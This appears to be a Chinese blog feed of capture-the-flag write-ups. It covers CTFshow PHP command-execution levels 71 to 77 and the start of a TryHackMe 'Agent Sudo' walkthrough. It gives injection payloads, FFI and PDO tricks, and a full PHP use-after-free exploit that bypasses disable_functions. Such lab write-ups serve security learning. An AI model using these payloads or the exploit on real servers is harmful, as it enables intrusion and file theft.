<p>查看源码，在命令执行后回显页面前先将内容进行替换</p>
<h4 id="方法一-21">方法一</h4>
<p>缓冲区劫持，可利用函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ob_flush();</span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);ob_flush();</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);ob_end_flush();</span><br></pre></td></tr></table></figure>
<h4 id="方法二-18">方法二</h4>
<p>命令执行之后就对程序进行退出操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit();</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);die();</span><br></pre></td></tr></table></figure>
<h2 id="web72">web72</h2>
<h3 id="payload-36">payload</h3>
<p>本题查找的payload还能看懂，但是后面读取不是很理解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>
<p>下面是对open_basedir()的绕过操作，没太看明白，需要再研究</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="web73">web73</h2>
<h3 id="payload-37">payload</h3>
<p>先查看再读取就行，本题禁用没有上一道严</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit(0);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure>
<h2 id="web74">web74</h2>
<h3 id="payload-38">payload</h3>
<p>本题限制了scandir函数，使用72的方法代替查找，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&quot;/flagx.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<h2 id="web75">web75</h2>
<h3 id="payload-39">payload</h3>
<p>本题都读取位置的方式跟上面相似</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>
<p>但是本题对于php PDO连接数据库的利用，但又有一个坑点就是对于数据库名的获取存在问题，好像绕过仅依赖于本题，没有一个合适的获取方法，必须得根据前面题目所获取的容器找到相关配置信息，所以不细说</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>
<h2 id="web76">web76</h2>
<h3 id="payload-40">payload</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>
<p>同75</p>
<h2 id="web77">web77</h2>
<h3 id="payload-41">payload</h3>
<p>本题算是命令执行最后一题了</p>
<p>刚开始还是使用伪协议进行一个读取，得到如下内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin boot dev etc flag36x.txt home lib lib64 media mnt opt proc readflag root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
<p>存在一个flag36x.txt和readflag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$a=&#x27;/readflag &gt; 1.txt&#x27;;$ffi-&gt;system($a);</span><br></pre></td></tr></table></figure>
<p>最终需要的FFI调用绕过system函数的手段</p>
<p>FFI是PHP中调用C代码的手段</p>
<p>然后由于无回显将readflag内容写入1.txt，再读取1.txt得到flag</p>
]]></content>
      <categories>
        <category>CTFshow</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>Tryhackme-easy-Agent Sudo</title>
    <url>/2024/03/13/Tryhackme-easy-Agent%20Sudo/</url>
    <content><![CDATA[<h1>Tryhackme-easy-Agent Sudo</h1>
<h2 id="Agent-Sudo">Agent Sudo</h2>
<h3 id="Enumerate">Enumerate</h3>
<ol>
<li>
<p>How many open ports?</p>
<p>可能是因为网络延迟的问题，导致开始的时候一个端口都没扫描出来，延时可以适当开高一点点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/05/pV4LatyfSXNCl35.png" alt="Tryhackme_5_1"></p>
</li>
<li>
<p>How you redirect yourself to a secret page?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user-agent</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/05/OlMXjakTzYwE74N.png" alt="Tryhackme_5_2"></p>
</li>
<li>
<p>What is the agent name?</p>
<p>user-agent参数为C的时候，可以收到回复</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Attention chris,</span><br><span class="line"></span><br><span class="line">Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!</span><br><span class="line"></span><br><span class="line">From,</span><br><span class="line">Agent R</span><br></pre></td></tr></table></figure>
<p>因此可以获取本题的答案是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chris</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Hash-cracking-and-brute-force">Hash cracking and brute-force</h3>
<p>FTP password</p>
<ol>
<li>
<p>FTP password</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crystal</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/05/LI6Zid3JzXKVAYE.png" alt="Tryhackme_5_3"></p>
</li>
<li>
<p>Zip file password</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||57590|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt</span><br><span class="line">-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg</span><br><span class="line">-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; mget *</span><br><span class="line">mget To_agentJ.txt [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||37193|)</span><br><span class="line">150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).</span><br><span class="line">100% |*************************************************************************************************************|   217       53.09 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">217 bytes received in 00:00 (0.75 KiB/s)</span><br><span class="line">mget cute-alien.jpg [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||42821|)</span><br><span class="line">150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).</span><br><span class="line">100% |*************************************************************************************************************| 33143      113.24 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">33143 bytes received in 00:00 (57.12 KiB/s)</span><br><span class="line">mget cutie.png [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||18497|)</span><br><span class="line">150 Opening BINARY mode data connection for cutie.png (34842 bytes).</span><br><span class="line">100% |*************************************************************************************************************| 34842       60.41 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">34842 bytes received in 00:00 (40.51 KiB/s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ftp登录之后将文件进行下载，然后寻找相关线索</p>
<p>将图片分析后发现存在一个压缩包</p>
